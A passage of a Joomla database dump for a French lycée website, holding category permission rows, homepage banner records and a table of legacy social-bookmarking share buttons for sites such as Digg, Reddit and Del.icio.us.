(131, 104, 235, 236, 3, 'com_content.category.33', 'Événements', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(132, 104, 233, 234, 3, 'com_content.category.34', 'Important', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(133, 104, 237, 238, 3, 'com_content.category.35', 'Voyages', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(134, 127, 265, 266, 3, 'com_content.category.36', 'Association des Parents d''Élèves', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(135, 127, 267, 268, 3, 'com_content.category.37', 'Conseil de la vie lycéenne', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(136, 102, 195, 196, 3, 'com_content.category.38', 'Réglement Intérieur', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(138, 127, 273, 274, 3, 'com_content.category.40', 'Scolarité', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(139, 127, 275, 276, 3, 'com_content.category.41', 'Foyer Socio-Educatif', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(140, 128, 246, 249, 4, 'com_content.category.42', 'Natation', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(141, 128, 250, 251, 4, 'com_content.category.43', 'Badminton', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(142, 128, 252, 253, 4, 'com_content.category.44', 'Musculation', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(143, 128, 254, 255, 4, 'com_content.category.45', 'Foot en salle', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(144, 128, 256, 257, 4, 'com_content.category.46', 'Basketball', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(145, 128, 258, 259, 4, 'com_content.category.47', 'Tennis de table', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(146, 128, 260, 261, 4, 'com_content.category.48', 'Volleyball', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(147, 128, 262, 263, 4, 'com_content.category.49', 'Tennis', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(148, 140, 247, 248, 5, 'com_content.article.73', 'Test natation 1', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(149, 3, 6, 7, 2, 'com_banners.category.50', 'Accueil', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(150, 3, 8, 11, 2, 'com_banners.category.51', 'Lycée', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(151, 150, 9, 10, 3, 'com_banners.category.52', 'Personnel', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(152, 3, 12, 13, 2, 'com_banners.category.53', 'Formations', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(153, 3, 14, 29, 2, 'com_banners.category.54', 'Vie Scolaire', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(154, 153, 15, 16, 3, 'com_banners.category.55', 'Scolarité', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(155, 153, 17, 18, 3, 'com_banners.category.56', 'Foyer Socio-Educatif', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(156, 153, 19, 20, 3, 'com_banners.category.57', 'Restauration', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(157, 153, 21, 22, 3, 'com_banners.category.58', 'CDI', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(158, 153, 23, 24, 3, 'com_banners.category.59', 'Associations Sportives', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(159, 153, 25, 26, 3, 'com_banners.category.60', 'CVL', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(160, 153, 27, 28, 3, 'com_banners.category.61', 'Association des Parents d''Elèves', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(161, 3, 30, 31, 2, 'com_banners.category.62', 'Actualités', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}');

-- --------------------------------------------------------

--
-- Table structure for table `jos_associations`
--

CREATE TABLE IF NOT EXISTS `jos_associations` (
  `id` varchar(50) NOT NULL COMMENT 'A reference to the associated item.',
  `context` varchar(50) NOT NULL COMMENT 'The context of the associated item.',
  `key` char(32) NOT NULL COMMENT 'The key for the association computed from an md5 on associated ids.',
  PRIMARY KEY (`context`,`id`),
  KEY `idx_key` (`key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_banners`
--

CREATE TABLE IF NOT EXISTS `jos_banners` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cid` int(11) NOT NULL DEFAULT '0',
  `type` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `imptotal` int(11) NOT NULL DEFAULT '0',
  `impmade` int(11) NOT NULL DEFAULT '0',
  `clicks` int(11) NOT NULL DEFAULT '0',
  `clickurl` varchar(200) NOT NULL DEFAULT '',
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `custombannercode` varchar(2048) NOT NULL,
  `sticky` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `params` text NOT NULL,
  `own_prefix` tinyint(1) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `reset` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `language` char(7) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `idx_state` (`state`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`),
  KEY `idx_banner_catid` (`catid`),
  KEY `idx_language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `jos_banners`
--

INSERT INTO `jos_banners` (`id`, `cid`, `type`, `name`, `alias`, `imptotal`, `impmade`, `clicks`, `clickurl`, `state`, `catid`, `description`, `custombannercode`, `sticky`, `ordering`, `metakey`, `params`, `own_prefix`, `metakey_prefix`, `purchase_type`, `track_clicks`, `track_impressions`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `reset`, `created`, `language`) VALUES
(1, 0, 0, 'Slide Accueil 1', 'slide-accueil-1', 0, 6568, 182, 'https://www.lyceemaximiliensorre.fr/index.php/actualites/51-voyage-a-liverpool', 1, 50, '', '', 0, 3, '', '{"imageurl":"files\\/images\\/banners\\/salleTP2.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-08-19 00:00:00', '2011-07-19 04:21:34', '*'),
(2, 0, 0, 'Slide Accueil 2', 'slide-accueil-2', 0, 6269, 137, 'http://http://#', 1, 50, 'descriptif', '', 0, 2, '', '{"imageurl":"files\\/images\\/banners\\/entreeMaximilien.jpg","width":"","height":"","alt":"texte alternatif"}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-09-07 00:00:00', '2011-08-07 07:43:13', '*'),
(3, 0, 0, 'Slide Accueil 3', 'slide-accueil-3', 0, 6270, 151, 'http://http://#', 1, 50, '', '', 0, 1, '', '{"imageurl":"files\\/images\\/banners\\/ordinateursMaximilien.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 390, '2016-06-23 08:56:18', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-09-07 00:00:00', '2011-08-07 07:45:29', '*'),
(4, 0, 0, 'Slide-4', 'slide-4', 0, 483, 34, '#', -2, 3, '', '', 0, 0, '', '{"imageurl":"images\\/banners\\/slide-4.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-09-07 00:00:00', '2011-08-07 07:45:41', '*'),
(5, 0, 0, 'Slide-5', 'slide-5', 0, 483, 34, '#', -2, 3, '', '', 0, 0, '', '{"imageurl":"images\\/banners\\/slide-5.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-09-07 00:00:00', '2011-08-07 07:45:51', '*'),
(6, 0, 0, 'Slide-6', 'slide-6', 0, 483, 28, '#', -2, 3, '', '', 0, 0, '', '{"imageurl":"images\\/banners\\/slide-6.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2011-09-07 00:00:00', '2011-08-07 07:46:03', '*'),
(7, 0, 0, 'Slide Lycée 1', 'slide-lycee-1', 0, 9, 0, '', 1, 51, '', '', 0, 1, '', '{"imageurl":"files\\/images\\/banners\\/foyer.jpg","width":"","height":"","alt":""}', 0, '', -1, 0, 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '2016-06-23 08:48:58', '*');

-- --------------------------------------------------------

--
-- Table structure for table `jos_banner_clients`
--

CREATE TABLE IF NOT EXISTS `jos_banner_clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `contact` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `extrainfo` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `metakey` text NOT NULL,
  `own_prefix` tinyint(4) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_banner_tracks`
--

CREATE TABLE IF NOT EXISTS `jos_banner_tracks` (
  `track_date` datetime NOT NULL,
  `track_type` int(10) unsigned NOT NULL,
  `banner_id` int(10) unsigned NOT NULL,
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`track_date`,`track_type`,`banner_id`),
  KEY `idx_track_date` (`track_date`),
  KEY `idx_track_type` (`track_type`),
  KEY `idx_banner_id` (`banner_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_authors`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_authors` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `url` varchar(255) DEFAULT NULL,
  `about` text,
  `avatar` varchar(225) DEFAULT NULL,
  `attribs` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_bookmarks`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_bookmarks` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `website` varchar(255) NOT NULL DEFAULT '',
  `html` text NOT NULL,
  `published` tinyint(4) NOT NULL DEFAULT '0',
  `type` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=61 ;

--
-- Dumping data for table `jos_bloggies_bookmarks`
--

INSERT INTO `jos_bloggies_bookmarks` (`id`, `website`, `html`, `published`, `type`) VALUES
(1, 'Digg.com - Small Button', '<a rel="nofollow" href="http://digg.com/" title="Digg!" target="_blank" onclick="window.open(''http://digg.com/submit?url=***url***&title=***title***&bodytext=***description***''); return false;"><img height="18px" width="18px" src="***imageDirectory***/digg.png" alt="Digg!" title="Digg!" /></a>', 0, 'button'),
(2, 'Digg.com - JavaScript Badge', '<script type="text/javascript">digg_url = ''***url***''; digg_title = ''***title***''; digg_bodytext = ''***description***''; digg_bgcolor = ''***bgcolor***''; digg_window = ''new'';</script><script src="http://digg.com/tools/diggthis.js" type="text/javascript"></script>', 0, 'badge'),
(3, 'Digg.com - JavaScript Compact Badge', '<script type="text/javascript">digg_url = ''***url***''; digg_title = ''***title***''; digg_bodytext = ''***description***''; digg_bgcolor = ''***bgcolor***''; digg_skin = ''compact''; digg_window = ''new'';</script><script src="http://digg.com/tools/diggthis.js" type="text/javascript"></script>', 0, 'button'),
(4, 'Reddit.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://reddit.com/submit?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://reddit.com" title="Reddit!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/reddit.png" alt="Reddit!" title="Reddit!" /></a>', 0, 'button'),
(5, 'Reddit.com - JavaScript Badge Style 1', '<script>reddit_url=''***url***''</script><script>reddit_title=''***title***''</script><script type="text/javascript" src="http://reddit.com/button.js?t=1"></script>', 0, 'badge'),
(6, 'Reddit.com - JavaScript Badge Style 2', '<script>reddit_url=''***url***''</script><script>reddit_title=''***title***''</script><script type="text/javascript" src="http://reddit.com/button.js?t=2"></script>', 0, 'badge'),
(7, 'Reddit.com - JavaScript Badge Style 3', '<script>reddit_url=''***url***''</script><script>reddit_title=''***title***''</script><script type="text/javascript" src="http://reddit.com/button.js?t=3"></script>', 0, 'badge'),
(8, 'Del.icio.us - Small Button', '<a rel="nofollow" href="http://del.icio.us/" title="Del.icio.us!" target="_blank" onclick="window.open(''http://del.icio.us/post?v=4&noui&jump=close&url=***url_encoded***&title=***title_encoded***''); return false;"><img height="18px" width="18px" src="***imageDirectory***/delicious.png" alt="Del.icio.us!" title="Del.icio.us!" /></a>', 0, 'button'),
(9, 'Del.icio.us - JavaScript Tall Badge', '<script src="http://images.del.icio.us/static/js/blogbadge.js"></script>', 0, 'button'),
(10, 'Del.icio.us - JavaScript One Line Badge', '<script type="text/javascript">if (typeof window.Delicious == "undefined") window.Delicious = {}; Delicious.BLOGBADGE_DEFAULT_CLASS = ''delicious-blogbadge-line'';</script><script src="http://images.del.icio.us/static/js/blogbadge.js"></script>', 0, 'button'),
(11, 'Mixx - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.mixx.com/submit?page_url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.mixx.com/" title="Mixx!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/mixx.png" alt="Mixx!" title="Mixx!" /></a>', 0, 'button'),
(12, 'EntirelyOpenSource.com - Small Button', '<a onclick="window.open(''http://www.entirelyopensource.com/submit.php?url=***url_encoded***''); return false;" href="http://www.entirelyopensource.com/" title="Free and Open Source Software News" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/entirelyopensource.png" alt="Free and Open Source Software News" title="Free and Open Source Software News" /></a>', 0, 'button'),
(13, 'Google Bookmarks - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.google.com/bookmarks/mark?op=edit&bkmk=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.google.com/bookmarks/" title="Google!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/google.png" alt="Google!" title="Google!" /></a>', 0, 'button'),
(14, 'Live.com - Small Button', '<a rel="nofollow" onclick="window.open(''https://favorites.live.com/quickadd.aspx?url=***url_encoded***&title=***title_encoded***''); return false;" href="https://favorites.live.com/" title="Live!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/live.png" alt="Live!" title="Live!" /></a>', 0, 'button'),
(15, 'Facebook.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.facebook.com/sharer.php?u=***url_encoded***&t=***title_encoded***''); return false;" href="https://www.facebook.com/" title="Facebook!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/facebook.png" alt="Facebook!" title="Facebook!" /></a>', 0, 'button'),
(16, 'Slashdot.org - Small Button', '<a rel="nofollow" onclick="window.open('' http://slashdot.org/bookmark.pl?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://slashdot.org/" title="Slashdot!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/slashdot.png" alt="Slashdot!" title="Slashdot!" /></a>', 0, 'button'),
(17, 'Netscape.com - Small Button', '<a rel="nofollow" onclick="window.open(http://www.netscape.com/submit/?U=***url_encoded***&T=***title_encoded***''); return false;" href="http://www.netscape.com/" title="Netscape!" target="_blank"><img height="18px" width="18px" src="***imageDirectory***/netscape.png" alt="Netscape!" title="Netscape!" /></a>', 0, 'button'),
(18, 'Technorati.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.technorati.com/faves?add=***url_encoded***''); return false;" href="http://www.technorati.com/" title="Technorati!" target="_blank"><img src="***imageDirectory***/technorati.png" alt="Technorati!" title="Technorati!" /></a>', 0, 'button'),
(19, 'StumbleUpon.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.stumbleupon.com/submit?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.stumbleupon.com/" title="StumbleUpon!" target="_blank"><img src="***imageDirectory***/stumbleupon.png" alt="StumbleUpon!" title="StumbleUpon!" /></a>', 0, 'button'),
(20, 'MySpace.com - Small Button', '<a rel="nofollow" href="http://www.myspace.com/" title="MySpace!" target="_blank" onclick="window.open(''http://www.myspace.com/Modules/PostTo/Pages/?t=***title***&u=***url***''); return false;"><img height="18px" width="18px" src="***imageDirectory***/myspace.png" alt="MySpace!" title="MySpace!" /></a>', 0, 'button'),
(21, 'Spurl.net - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.spurl.net/spurl.php?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.spurl.net/" title="Spurl!" target="_blank"><img src="***imageDirectory***/spurl.png" alt="Spurl!" title="Spurl!" /></a>', 0, 'button'),
(22, 'Wists.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://wists.com/r.php?c=&r=***url_encoded***&tot;e=***title_encoded***''); return false;" href="http://wists.com/" title="Wists!" target="_blank"><img src="***imageDirectory***/wists.png" alt="Wists!" title="Wists!" /></a>', 0, 'button'),
(23, 'Simpy.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.simpy.com/simpy/LinkAdd.do?href=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.simpy.com/" title="Simpy!" target="_blank"><img src="***imageDirectory***/simpy.png" alt="Simpy!" title="Simpy!" /></a>', 0, 'button'),
(24, 'Newsvine.com - Small Button', '<a rel="nofollow" onclick="window.open('' http://www.newsvine.com/_wine/save?u=***url_encoded***&h=***title_encoded***''); return false;" href="http://www.newsvine.com/" title="Newsvine!" target="_blank"><img src="***imageDirectory***/newsvine.png" alt="Newsvine!" title="Newsvine!" /></a>', 0, 'button'),
(25, 'BlinkList.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://blinklist.com/index.php?Action=Blink/addblink.php&Url=***url_encoded***&Title=***title_encoded***''); return false;" href="http://www.blinklist.com/" title="Blinklist!" target="_blank"><img src="***imageDirectory***/blinklist.png" alt="Blinklist!" title="Blinklist!" /></a>', 1, 'button'),
(26, 'Furl.net - Small Button', '<a rel="nofollow" onclick="window.open(''http://furl.net/storeIt.jsp?u=***url_encoded***&t=***title_encoded***''); return false;" href="http://www.furl.net/" title="Furl!" target="_blank"><img src="***imageDirectory***/furl.png" alt="Furl!" title="Furl!" /></a>', 0, 'button'),
(27, 'Fark.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://cgi.fark.com/cgi/fark/submit.pl?new_url=***url_encoded***&new_comment=***title_encoded***&linktype='');return false;" href="http://fark.com" title="Fark!" target="_blank"><img src="***imageDirectory***/fark.png" alt="Fark!" title="Fark!" /></a>', 0, 'button'),
(28, 'BlogMarks.net - Small Button', '<a rel="nofollow" onclick="window.open(''http://blogmarks.net/my/new.php?mini=1&simple=1&url=***url_encoded***&title=***title_encoded***''); return false;" href="http://blogmarks.net/" title="Blogmarks!" target="_blank"><img src="***imageDirectory***/blogmarks.png" alt="Blogmarks!" title="Blogmarks!" /></a>', 1, 'button'),
(29, 'Yahoo! Buzz - Small Button', '<a rel="nofollow" onclick="window.open(''http://myweb2.search.yahoo.com/myresults/bookmarklet?u=***url_encoded***&t=***title_encoded***''); return false;" href="http://myweb2.search.yahoo.com/" title="Yahoo!" target="_blank"><img src="***imageDirectory***/yahoo.png" alt="Yahoo!" title="Yahoo!" /></a>', 0, 'button'),
(30, 'Smarking.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://smarking.com/editbookmark/?url=***url_encoded***''); return false;" href="http://smarking.com/" title="Smarking!" target="_blank"><img src="***imageDirectory***/smarking.png" alt="Smarking!" title="Smarking!" /></a>', 0, 'button'),
(31, 'Netvouz.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.netvouz.com/action/submitBookmark?url=***url_encoded***&title=***title_encoded***&popup=no''); return false;" href="http://www.netvouz.com/" title="Smarking!" target="_blank"><img src="***imageDirectory***/netvouz.png" alt="Netvouz!" title="Netvouz!" /></a>', 0, 'button'),
(32, 'Mister-Wong.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.mister-wong.com/index.php?action=addurl&bm_url=***url_encoded***&bm_description=***title_encoded***''); return false;" href="http://www.mister-wong.com/" title="Mister-Wong!" target="_blank"><img src="***imageDirectory***/mister-wong.png" alt="Mister-Wong!" title="Mister-Wong!" /></a>', 0, 'button'),
(33, 'RawSugar.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.rawsugar.com/tagger/?turl=***url_encoded***&tttl=***title_encoded***&editorInitialized=1''); return false;" href="http://www.rawsugar.com/" title="RawSugar!" target="_blank"><img src="***imageDirectory***/rawsugar.png" alt="RawSugar!" title="RawSugar!" /></a>', 0, 'button'),
(34, 'Ma.gnolia.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://ma.gnolia.com/bookmarklet/add?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://ma.gnolia.com/" title="Ma.gnolia!" target="_blank"><img src="***imageDirectory***/magnolia.png" alt="Ma.gnolia!" title="Ma.gnolia!" /></a>', 0, 'button'),
(35, 'Squidoo.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.squidoo.com/lensmaster/bookmark?***url_encoded***&title=***title_encoded***''); return false;" href="http://www.squidoo.com/" title="Squidoo!" target="_blank"><img src="***imageDirectory***/squidoo.png" alt="Squidoo!" title="Squidoo!" /></a>', 0, 'button'),
(36, 'FeedMeLinks.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://feedmelinks.com/categorize?from=toolbar&op=submit&url=***url_encoded***&name=***title_encoded***''); return false;" href="http://feedmelinks.com/" title="FeedMeLinks!" target="_blank"><img src="***imageDirectory***/feedmelinks.png" alt="FeedMeLinks!" title="FeedMeLinks!" /></a>', 0, 'button'),
(37, 'BlinkBits.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.blinkbits.com/bookmarklets/save.php?v=1&source_url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.blinkbits.com/" title="BlinkBits!" target="_blank"><img src="***imageDirectory***/blinkbits.png" alt="BlinkBits!" title="BlinkBits!" /></a>', 1, 'button'),
(38, 'TailRank.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://tailrank.com/share/?link_href=***url_encoded***&title=***title_encoded***''); return false;" href="http://tailrank.com/" title="Tailrank!" target="_blank"><img src="***imageDirectory***/tailrank.png" alt="Tailrank!" title="Tailrank!" /></a>', 0, 'button'),
(39, 'linkaGoGo.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.linkagogo.com/go/AddNoPopup?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.linkagogo.com/" title="linkaGoGo!" target="_blank"><img src="***imageDirectory***/linkagogo.png" alt="linkaGoGo!" title="linkaGoGo!" /></a>', 0, 'button'),
(40, 'Cannotea.org - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.connotea.org/addpopup?continue=confirm&uri=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.cannotea.org/" title="Cannotea!" target="_blank"><img src="***imageDirectory***/cannotea.png" alt="Cannotea!" title="Cannotea!" /></a>', 0, 'button'),
(41, 'Diigo.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.diigo.com/post?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.diigo.com/" title="Diigo!" target="_blank"><img src="***imageDirectory***/diigo.png" alt="Diigo!" title="Diigo!" /></a>', 0, 'button'),
(42, 'Faves.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://faves.com/Authoring.aspx?u=***url_encoded***&t=***title_encoded***''); return false;" href="http://faves.com/" title="Faves!" target="_blank"><img src="***imageDirectory***/faves.png" alt="Faves!" title="Faves!" /></a>', 0, 'button'),
(43, 'Ask.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://myjeeves.ask.com/mysearch/BookmarkIt?v=1.2&t=webpages&url=***url_encoded***&title=***title_encoded***''); return false;" href="http://faves.com/" title="Ask!" target="_blank"><img src="***imageDirectory***/ask.png" alt="Ask!" title="Ask!" /></a>', 1, 'button'),
(44, 'DZone.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.dzone.com/links/add.html?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://www.dzone.com/" title="DZone!" target="_blank"><img src="***imageDirectory***/dzone.png" alt="DZone!" title="DZone!" /></a>', 0, 'button'),
(45, 'DZone.com - JavaScript Tall Badge', '<script type="text/javascript">var dzone_url = ''***url***'';</script><script type="text/javascript">var dzone_title = ''***title***'';</script><script type="text/javascript">var dzone_blurb = ''***description***'';</script><script type="text/javascript">var dzone_style = ''1'';</script><script language="javascript" src="http://widgets.dzone.com/widgets/zoneit.js"></script>', 0, 'badge'),
